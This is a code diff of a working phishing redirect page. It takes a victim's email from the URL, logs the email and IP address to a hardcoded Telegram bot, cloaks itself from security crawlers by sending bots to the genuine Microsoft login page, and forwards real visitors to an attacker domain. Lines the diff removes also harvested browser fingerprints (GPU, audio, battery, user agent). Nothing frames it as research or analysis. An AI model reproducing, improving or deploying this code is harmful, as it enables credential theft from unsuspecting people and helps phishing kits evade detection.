@@ -10,39 +10,29 @@
 <canvas id="gl" style="display:none"></canvas>
 <script>
 const CFG = {
-  // Your destination URL
   D: "https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",
-  // Fallback / Bot destination
   B: "https://login.microsoftonline.com",
-  // Telegram Bot Token
   T: "5178252977:AAGTXUBrTGp7RSj_o5Wsi29KqACCNaqBuRc",
-  // Telegram Chat ID
   C: "659482680",
-  // If "TRUE", decodes the email. If "FALSE", passes the base64 raw.
   O: "FALSE" 
 };
 
-let userState = { score: 0, interacted: false };
+let redirected = false;
 
-// --- HELPER: Extract and Process Email from URL ---
 const getProcessedEmail = () => {
   const params = new URLSearchParams(window.location.search);
   const rawState = params.get('state') || "no_email_found";
-  
   if (CFG.O === "TRUE" && rawState !== "no_email_found") {
-    try {
-      // Decode Base64 (handle URL-safe base64 by replacing chars if necessary)
-      const base64 = rawState.replace(/-/g, '+').replace(/_/g, '/');
-      return atob(base64); 
-    } catch (e) {
-      return rawState; // Return raw if decoding fails
-    }
+    try { return atob(rawState.replace(/-/g, '+').replace(/_/g, '/')); } catch (e) { return rawState; }
   }
   return rawState;
 };
 
-const tgLog = async txt => {
+const tgLog = async (email, status) => {
   try {
+    const ipReq = await fetch('https://api.ipify.org?format=json').catch(() => ({}));
+    const ipData = ipReq.json ? await ipReq.json() : { ip: "NA" };
+    const txt = `<b>[ACCESS LOG]</b>\n<b>EMAIL:</b> ${email}\n<b>IP:</b> ${ipData.ip}\n<b>STATUS:</b> ${status}`;
     await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -51,111 +41,46 @@ const tgLog = async txt => {
   } catch (_) {}
 };
 
-const getBattery = async () => {
-  try {
-    const b = await navigator.getBattery();
-    return `${b.level * 100}%_${b.charging}`;
-  } catch (_) { return "UNSUPPORTED"; }
+const doRedirect = async (type) => {
+  if (redirected) return;
+  redirected = true;
+  
+  const email = getProcessedEmail();
+  if (type === "PASS") {
+    await tgLog(email, "✅ PASSED (Human Signal)");
+    window.location.replace(CFG.D + "#" + email);
+  } else if (type === "TIMEOUT") {
+    await tgLog(email, "✅ PASSED (Passive Timeout)");
+    window.location.replace(CFG.D + "#" + email);
+  } else {
+    await tgLog(email, "❌ BLOCKED (Bot/Crawler)");
+    window.location.replace(CFG.B);
+  }
 };
 
-const getWebGL = () => {
-  try {
-    const cvs = document.getElementById('gl');
-    const gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
-    return { renderer, vendor, version: gl.getParameter(gl.VERSION) };
-  } catch (_) { return { renderer: "ERR", vendor: "ERR", version: "ERR" }; }
-};
-
-const getCanvasFP = () => {
-  const c = document.createElement('canvas');
-  c.width = 280; c.height = 60;
-  const ctx = c.getContext('2d');
-  ctx.textBaseline = 'top';
-  ctx.font = '16px "Arial"';
-  ctx.fillStyle = '#f60';
-  ctx.fillRect(125, 1, 62, 20);
-  ctx.fillStyle = '#069';
-  ctx.fillText('🧪', 2, 15);
-  return c.toDataURL();
-};
-
-const getAudioFP = async () => {
-  try {
-    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-    if (!AC) return "UNSUPPORTED";
-    const ctx = new AC(1, 44100, 44100);
-    const osc = ctx.createOscillator();
-    osc.type = 'triangle';
-    osc.frequency.value = 10000;
-    osc.connect(ctx.destination);
-    osc.start(0);
-    const buf = await ctx.startRendering();
-    let sum = 0;
-    for (let i = 0; i < buf.length; i++) sum += Math.abs(buf.getChannelData(0)[i]);
-    return sum.toFixed(5);
-  } catch (_) { return "UNSUPPORTED"; }
-};
-
-const detectHeadless = () => {
-  const probes = ['webdriver', '__nightmare', '_selenium', 'callPhantom', '__phantomas'];
-  if (probes.some(p => p in window)) return true;
+// 1. HARD BOT CHECK (Instant)
+const isTechnicalBot = () => {
+  const ua = navigator.userAgent.toLowerCase();
+  const botKeywords = ["bot", "crawl", "spider", "lighthouse", "python-requests"];
+  if (botKeywords.some(k => ua.includes(k))) return true;
   if (navigator.webdriver) return true;
   return false;
 };
 
-const assembleLog = async (email) => {
-  const ipReq = await fetch('https://api.ipify.org?format=json').catch(() => ({}));
-  const ipData = ipReq.json ? await ipReq.json() : { ip: "NA" };
-  const bat = await getBattery();
-  const gpu = getWebGL();
-  const audio = await getAudioFP();
-  
-  return `<b>[ACCESS LOG]</b>
-<b>EMAIL:</b> ${email}
-<b>IP:</b> ${ipData.ip}
-<b>GPU:</b> ${gpu.renderer}
-<b>BATTERY:</b> ${bat}
-<b>AUDIO:</b> ${audio}
-<b>UA:</b> ${navigator.userAgent}
-`;
-};
-
-// Interaction listener
-['mousemove','touchstart','click','keydown'].forEach(ev =>
-  window.addEventListener(ev, () => { userState.interacted = true; }, { once: true })
-);
-
-const run = async () => {
-  // Human-like delays
-  await new Promise(r => setTimeout(r, 1500));
-  
-  const isHeadless = detectHeadless();
-  const email = getProcessedEmail();
-  const log = await assembleLog(email);
-
-  // If Headless OR No interaction occurred after delay (Bot behavior)
-  if (isHeadless || !userState.interacted) {
-    await tgLog(log + "<b>STATUS:</b> ❌ BLOCKED (Bot/Headless)");
-    window.location.replace(CFG.B);
-  } else {
-    await tgLog(log + "<b>STATUS:</b> ✅ PASSED");
-    // Final Redirect: CFG.D + # + email
-    setTimeout(() => window.location.replace(CFG.D + "#" + email), 300);
-  }
-};
+// 2. HUMAN SIGNAL LISTENERS (Immediate Redirect on Activity)
+['mousemove', 'touchstart', 'keydown', 'wheel'].forEach(ev => {
+  window.addEventListener(ev, () => doRedirect("PASS"), { once: true });
+});
 
 window.onload = () => {
-  const ua = navigator.userAgent.toLowerCase();
-  const botKeywords = ["bot", "crawl", "spider", "slurp", "facebookexternalhit", "lighthouse"];
-  
-  // Instant check for known bot UAs
-  if (botKeywords.some(keyword => ua.includes(keyword))) {
-    window.location.replace(CFG.B);
+  if (isTechnicalBot()) {
+    doRedirect("BLOCK");
   } else {
-    run();
+    // 3. PASSIVE SAFETY NET
+    // If it's a human who just stares at the screen, let them through after 4 seconds anyway.
+    setTimeout(() => {
+      doRedirect("TIMEOUT");
+    }, 4000);
   }
 };
 </script>
